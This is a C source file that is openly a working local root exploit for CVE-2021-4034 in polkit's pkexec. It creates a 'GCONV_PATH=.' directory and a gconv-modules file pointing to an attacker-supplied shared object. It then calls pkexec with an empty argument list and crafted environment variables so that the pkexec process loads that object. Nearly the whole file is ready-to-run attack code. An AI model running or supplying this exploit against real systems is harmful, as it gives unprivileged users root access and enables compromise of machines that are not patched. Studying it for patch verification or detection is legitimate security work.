#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include "config.h"

int cp(const char *to, const char *from)
{
    int fd_to, fd_from;
    char buf[4096];
    ssize_t nread;
    int saved_errno;

    fd_from = open(from, O_RDONLY);
    if (fd_from < 0)
        return -1;

    fd_to = open(to, O_WRONLY | O_CREAT | O_EXCL, 0666);
    if (fd_to < 0)
        goto out_error;

    while (nread = read(fd_from, buf, sizeof buf), nread > 0)
    {
        char *out_ptr = buf;
        ssize_t nwritten;

        do {
            nwritten = write(fd_to, out_ptr, nread);

            if (nwritten >= 0)
            {
                nread -= nwritten;
                out_ptr += nwritten;
            }
            else if (errno != EINTR)
            {
                goto out_error;
            }
        } while (nread > 0);
    }

    if (nread == 0)
    {
        if (close(fd_to) < 0)
        {
            fd_to = -1;
            goto out_error;
        }
        close(fd_from);

        /* Success! */
        return 0;
    }

  out_error:
    saved_errno = errno;

    close(fd_from);
    if (fd_to >= 0)
        close(fd_to);

    errno = saved_errno;
    return -1;
}

int main(){
    print_info(MAGENTA("CVE-2021-4034") " Exploit By " GREEN(AUTHOR));
    print_info("Initializing Setup");

    // Set GCONV_PATH to the current directory
    if(mkdir("GCONV_PATH=.",0777) && errno != EEXIST ){
        exit_on_error("Could not create GCONV_PATH=.");
    }
    
    char* filepath;
    if (asprintf(&filepath, "GCONV_PATH=./%s",DIR) < 0 ){
        exit_on_error("Out of memory :(");
    }

    int filedesc;
    if ((filedesc = creat(filepath, 0777))<0){
        exit_on_error("Failed to create file :(");
    }
    if (close(filedesc) < 0){
        exit_on_error("Failed To close file :(");
    }

    // Set GCONV_PATH to the current directory
    if(mkdir(DIR,0777) && errno != EEXIST ){
        exit_on_error("Failed to create exploit directory");
    }
    
    if(asprintf(&filepath, "%s/gconv-modules",DIR) < 0){
        exit_on_error("Out of memory :(");
    }
    FILE *f;
    f = fopen(filepath,"w");
    if (f == NULL){
        exit_on_error("Failed to open file for writing :(");
    }

    /* From  /usr/lib/gconv/gconv-modules :

    If the lines start with `module'
     fromset:	either a name triple or a regular expression triple.
     toset:	a name triple or an expression with \N to get regular
    	expression matching results.
     filename:	filename of the module implementing the transformation.
    	If it is not absolute the path is made absolute by prepending
    	the directory the configuration file is found in.
     cost:	optional cost of the transformation.  Default is 1.
    */
    fprintf(f,"module\tINTERNAL\t\t\t%s//\t\t\t%s\t\t\t2", AUTHOR, SHARED_OBJECT);
    fclose(f);
    free(filepath);

    // Copy shared object
    char *source;
    char *dest;

    if ((asprintf(&source,"%s.so", SHARED_OBJECT) < 0 ) || asprintf(&dest,"%s/%s.so", DIR, SHARED_OBJECT) < 0){
        exit_on_error("Out of memory :(");
    }

    if(access(source, F_OK) != 0){
        exit_on_error("Could Not Find Shared Object :(");
    }

    if (access(dest, F_OK) != 0){
        if (cp(dest, source) < 0){
            exit_on_error("Failed To copy file to exploit directory");
        }
    }
    
    if (chmod(dest, 0777) <0 ){
        exit_on_error("Failed to change permissions :(");
    }

    free(source);
    free(dest);
    print_success("Setup Done :D");

    /* Trigger out-of-bounds in argv[] by permanently 
    setting n = 1 at line 534 of pkexec's main() function:

    Line 534:   for (n = 1; n < (guint) argc; n++)
    */
    char *argv[] = { (char *)NULL };
    char *shell;
    char *charset;

    if((asprintf(&shell, "SHELL=%s",AUTHOR) < 0) || (asprintf(&charset, "CHARSET=%s",AUTHOR) < 0) ){
        exit_on_error("Out of memory :(");
    }

    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        shell,
        charset,
        NULL
    };

    execve(PKEXEC, argv, envp);
    free(charset);
    free(shell);
    return 0;
}